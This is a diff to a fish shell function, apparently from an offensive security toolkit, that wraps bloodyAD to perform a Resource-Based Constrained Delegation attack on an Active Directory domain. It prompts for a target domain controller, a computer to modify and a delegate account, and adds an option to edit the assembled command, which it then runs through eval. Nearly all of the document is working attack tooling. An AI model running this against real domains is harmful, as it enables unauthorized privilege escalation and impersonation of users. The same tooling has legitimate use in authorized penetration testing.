@@ -1,6 +1,6 @@
 # description: Resource-Based Constrained Delegation (RBCD) attack
 function __kronos_rbcd --description "Resource-Based Constrained Delegation (RBCD) attack"
-    argparse h/help q/quiet u/username= p/password= k/kerberos t/target-computer= m/delegate-to= a/action= w/wizard -- $argv
+    argparse h/help q/quiet u/username= p/password= k/kerberos t/target-computer= m/delegate-to= a/action= w/wizard X/edit-cmd -- $argv
     or return 1
 
     if set -q _flag_help
@@ -15,6 +15,7 @@ function __kronos_rbcd --description "Resource-Based Constrained Delegation (RBC
         echo "  -u, --username USER        Auth username"
         echo "  -p, --password PASS        Auth password"
         echo "  -k, --kerberos             Use Kerberos authentication"
+        echo "  -X, --edit-cmd             Edit the command before execution"
         echo "  -q, --quiet                Skip prompts and use fallbacks"
         echo "  -h, --help                 Show this help message"
         return 0
@@ -50,7 +51,7 @@ function __kronos_rbcd --description "Resource-Based Constrained Delegation (RBC
 
     # Interactive Fallback
     if not set -q _flag_quiet
-        if test -z "$target"; or test -z "$target_comp"; or test -z "$delegate_to"; or set -q _flag_wizard
+        if test (count $argv) -eq 0; or set -q _flag_wizard
             set target (__kronos_ask "Target DC IP/Hostname" "$target"); or return 1
             set -U __KRONOS_CACHE_RBCD_TARGET "$target"
 
@@ -59,10 +60,11 @@ function __kronos_rbcd --description "Resource-Based Constrained Delegation (RBC
 
             set delegate_to (__kronos_ask "Computer to delegate to" "$delegate_to"); or return 1
             set -U __KRONOS_CACHE_RBCD_DELEGATE_TO "$delegate_to"
-        end
-        if test -z "$auth_user"; and not set -q _flag_kerberos
-            set auth_user (__kronos_ask "Auth Username" "$auth_user"); or return 1
-            set -U __KRONOS_CACHE_RBCD_AUTH_USER "$auth_user"
+
+            if test -z "$auth_user"; and not set -q _flag_kerberos
+                set auth_user (__kronos_ask "Auth Username" "$auth_user"); or return 1
+                set -U __KRONOS_CACHE_RBCD_AUTH_USER "$auth_user"
+            end
         end
     end
 
@@ -79,21 +81,31 @@ function __kronos_rbcd --description "Resource-Based Constrained Delegation (RBC
         return 1
     end
 
-    set -l cmd_str bloodyAD --host "$target" -d "$domain"
+    set -l cmd_list bloodyAD --host "$target" -d "$domain"
     if set -q _flag_kerberos
-        set -a cmd_str -k
+        set -a cmd_list -k
     else
         if test -z "$auth_user"
             echo "error: auth credentials required" >&2
             return 1
         end
-        set -a cmd_str -u "$auth_user" -p "$auth_pass"
+        set -a cmd_list -u "$auth_user" -p "$auth_pass"
     end
 
-    set -a cmd_str $action rbcd "$target_comp" "$delegate_to"
+    set -a cmd_list $action rbcd "$target_comp" "$delegate_to"
 
     __kronos_check_dep bloodyAD; or return 1
 
+    set -l cmd_str ""
+    for part in $cmd_list
+        set cmd_str "$cmd_str "(string escape -- $part)
+    end
+    set cmd_str (string trim $cmd_str)
+
+    if set -q _flag_edit_cmd
+        set cmd_str (__kronos_edit_cmd "$cmd_str"); or return 1
+    end
+
     echo "[*] Performing RBCD $action on $target_comp for $delegate_to..."
-    command $cmd_str
+    eval $cmd_str
 end
